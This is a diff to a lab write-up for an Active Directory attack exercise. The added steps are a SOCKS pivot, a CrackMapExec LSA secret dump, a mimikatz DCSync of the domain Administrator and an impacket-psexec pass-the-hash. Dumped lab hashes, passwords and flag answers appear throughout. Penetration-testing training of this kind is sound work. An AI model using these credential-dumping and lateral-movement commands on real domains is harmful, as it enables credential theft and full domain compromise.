@@ -2598,15 +2598,10 @@ Upload `Invoke-SocksProxy.psm1` from [SocksProxy](https://github.com/p3nt4/Invok
 Press `Ctrl + D` to switch mode into the session and execute the `SocksProxy`.
 
 ```
-(remote) WEB-WIN01$@WEB-WIN01:C:\windows\system32\inetsrv$ powershell
-Windows PowerShell 
-Copyright (C) Microsoft Corporation. All rights reserved.
-
-PS C:\> Import-Module .\Invoke-SocksProxy.psm1
+(remote) WEB-WIN01$@WEB-WIN01:C:\$ Import-Module .\Invoke-SocksProxy.psm1
 Import-Module .\Invoke-SocksProxy.psm1
-PS C:\> Invoke-SocksProxy -bindPort 1082
-Invoke-SocksProxy -bindPort 1082
-Listening on port 1082...
+(remote) WEB-WIN01$@WEB-WIN01:C:\$ Invoke-SocksProxy -bindPort 1080
+Listening on port 1080...rt 1080
 ```
 
 Configure `/etc/proxychains.conf` with the target IP and listening port.
@@ -2620,8 +2615,6 @@ Configure `/etc/proxychains.conf` with the target IP and listening port.
 # defaults set to "tor"
 socks4 10.129.140.217 1082
 ```
-
-
 
 #### Alternate method:
 
@@ -2693,29 +2686,182 @@ RDP into the target box.
 ### Question 6:
 ![](./attachments/Pasted%20image%2020230308194627.png)
 
-```
+Use `CrackMapExec` with the `--lsa` flag to dump LSA secrets from target systems.
 
 ```
+┌──(kali㉿kali)-[~/HTB/ActiveDirectoryAttacks]
+└─$ proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  10.129.208.31:1080  ...  172.16.6.50:445  ...  OK
+[proxychains] Strict chain  ...  10.129.208.31:1080  ...  172.16.6.50:445  ...  OK
+[proxychains] Strict chain  ...  10.129.208.31:1080  ...  172.16.6.50:135  ...  OK
+SMB         172.16.6.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
+[proxychains] Strict chain  ...  10.129.208.31:1080  ...  172.16.6.50:445  ...  OK
+[proxychains] Strict chain  ...  10.129.208.31:1080  ...  172.16.6.50:445  ...  OK
+SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
+SMB         172.16.6.50     445    MS01             [+] Dumping LSA secrets
+SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801                                                                                                      
+SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb                                                                                                    
+SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245                                                                                        
+SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:7634a0b8bf09ea24e1177ffae549c74811f791dfbee80d5c6d6ad75bee9c5745                                                                        
+SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:e6998cd7a5065827263aafc35d8c663f                                                                                                        
+SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:des-cbc-md5:52ae34f731b98629
+SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:plain_password_hex:538938ad719772cc90e87ccdb13a28e6fa71db611314dd8ac2ad0a6e3aeba8678b826d12cc133eb497961fb07be1ec305297327de61bb8d8f60b2b341a790f6894d7c50afeddab27016526f4c6978048466cf3c0c07cebd406e5170858c10e0b674972d6815276947f65a5e88d2af67a9f02e0ccbd6d8340815d38a90c2a322c212f12615ea2ac88c2e34e0cf62c7202c3c536651df8efd2d358ad97c0b153bbda9b834fc9544b4c2afb9b5edba533a2dce1b8255344d0db0ad15c9ffe697cf76f7dc0818d6bfc955b91e8c1efecf48e2841e464e18a62e1fbf66583b71ee2060770d1dde094432ef3cb66fd391769e4         
+SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:04c17686dcca47a3ad7997740b1d2f9f:::                                                                                            
+SMB         172.16.6.50     445    MS01             INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
+SMB         172.16.6.50     445    MS01             dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786
+dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19                                                            
+SMB         172.16.6.50     445    MS01             NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63                                              
+SMB         172.16.6.50     445    MS01             [+] Dumped 11 LSA secrets to /home/kali/.cme/logs/MS01_172.16.6.50_2023-03-11_123336.secrets and /home/kali/.cme/logs/MS01_172.16.6.50_2023-03-11_123336.cached
+```
 
-**Answer:** ``
+user:pass `tpetty:Sup3rS3cur3D0m@inU2eR`
+
+**Answer:** `Sup3rS3cur3D0m@inU2eR`
 
 ### Question 7:
 ![](./attachments/Pasted%20image%2020230308194639.png)
 
-```
+Perform `DCSync` attack targeting the `Administrator` account on the Domain controller.
 
 ```
+PS C:\tools\mimikatz\x64> .\mimikatz.exe
 
-**Answer:** ``
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'INLANEFREIGHT\administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000200 ( NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 4/11/2022 8:24:49 PM
+Object Security ID   : S-1-5-21-2270287766-1317258649-2146029398-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 27dedb1dab4d8545c6e1c66fba077da0
+    ntlm- 0: 27dedb1dab4d8545c6e1c66fba077da0
+    ntlm- 1: bdaffbfe64f1fc646a3353be1c2c3c99
+    lm  - 0: 757743529af55e110994f3c7e3710fc9
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : b8bcb44123b3cc3bff20c663f1e0b94d
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : INLANEFREIGHT.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : a76102a5617bffb1ea84ba0052767992823fd414697e81151f7de21bb41b1857
+      aes128_hmac       (4096) : 69e27df2550c5c270eca1d8ce5c46230
+      des_cbc_md5       (4096) : c2d9c892f2e6f2dc
+    OldCredentials
+      aes256_hmac       (4096) : 51d2b5ce03d6ea2e75e69050f32b927d0e602c2806dcb0d1dd0aacdda619a510
+      aes128_hmac       (4096) : b93da9262f5ce0ed724ce0177366bc8a
+      des_cbc_md5       (4096) : 0876d604a7087cf7
+    OlderCredentials
+      aes256_hmac       (4096) : 23cbc0dad348bebcbdbb4c82e9b23af299e8b56de358bafe24f2235f34497e4a
+      aes128_hmac       (4096) : e35eb565af30c8ed79df5d8875508df6
+      des_cbc_md5       (4096) : 4904021983252cd5
+
+* Primary:Kerberos *
+    Default Salt : INLANEFREIGHT.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : c2d9c892f2e6f2dc
+    OldCredentials
+      des_cbc_md5       : 0876d604a7087cf7
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  c05d2bd2d448c260d63c391862358e9a
+    02  2ba60ae4300b00bd1a20b601f24e386a
+    03  cd2b7cce6ac8a39ac0a5a048feaa059a
+    04  c05d2bd2d448c260d63c391862358e9a
+    05  1084cdc6cf3b03a0425a0b4b6f8df2ab
+    06  4cbd7e1c07a9cd8f5d74821b8f7d73b5
+    07  a60dd8c295cfea5356e2e071336e4b73
+    08  9549ac69526305a3b52fc7eb81c36d5b
+    09  41883c94f1394d3f6420113ee9bde48b
+    10  cf77d4474145a014474eac18cb559026
+    11  9549ac69526305a3b52fc7eb81c36d5b
+    12  81319b4284c63dd5ecab7c53c41f2f4b
+    13  f586b7f78f320c2b7f7153e3adfa3d60
+    14  7ddf4411eb64636a952e01a3a6065213
+    15  581bab6ff054b23e65f14adc15126f9e
+    16  8638e61dd907d6ca411e1be885cf6ae2
+    17  fec8a8deb4f9320986e0deaae31c7974
+    18  f7dc49e2e0539d0e221b46139677c903
+    19  f405be39c0733cb794a2aca4b072f2a7
+    20  cf83e03b8abad7ae24a3b010cf3c7577
+    21  982dab323d8efa80ad1550985eb49e71
+    22  731741e7f2f621aaa2f446eb77997beb
+    23  b5928a821c656d267659d5eb5e4ab02d
+    24  020ab18e15e8a5fbd66748455afae6e5
+    25  4ac30d853103b2f8362243b72955d89f
+    26  9a0a62820b990a595affa9ac2119f299
+    27  5fda8e968eabd2561522cb2c2a918f56
+    28  224906fbb8c4570c87416aaee7b6419c
+    29  5632d3eb6e5fc24a09f67092988a92ef
+```
+
+Hash NTLM: `27dedb1dab4d8545c6e1c66fba077da0`
+
+**Answer:** `DCSync`
 
 ### Question 8:
 ![](./attachments/Pasted%20image%2020230308194647.png)
 
-```
+Login to the Domain controller using `impacket-psexec` by performing a PtH attack.
 
 ```
+┌──(kali㉿kali)-[~/HTB/ActiveDirectoryAttacks/noPac]
+└─$ proxychains impacket-psexec administrator@172.16.6.3 -hashes :27dedb1dab4d8545c6e1c66fba077da0
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
-**Answer:** ``
+[proxychains] Strict chain  ...  10.129.208.31:1080  ...  172.16.6.3:445  ...  OK
+[*] Requesting shares on 172.16.6.3.....
+[*] Found writable share ADMIN$
+[*] Uploading file XkeUIeFT.exe
+[*] Opening SVCManager on 172.16.6.3.....
+[*] Creating service ixuk on 172.16.6.3.....
+[*] Starting service ixuk.....
+[proxychains] Strict chain  ...  10.129.208.31:1080  ...  172.16.6.3:445  ...  OK
+[proxychains] Strict chain  ...  10.129.208.31:1080  ...  172.16.6.3:445  ...  OK
+[!] Press help for extra shell commands
+[proxychains] Strict chain  ...  10.129.208.31:1080  ...  172.16.6.3:445  ...  OK
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> type c:\Users\Administrator\Desktop\flag.txt
+r3plicat1on_m@st3r!
+C:\Windows\system32>
+```
+
+**Answer:** `r3plicat1on_m@st3r!`
 
 ---
 ## AD Enumeration & Attacks - Skills Assessment Part II
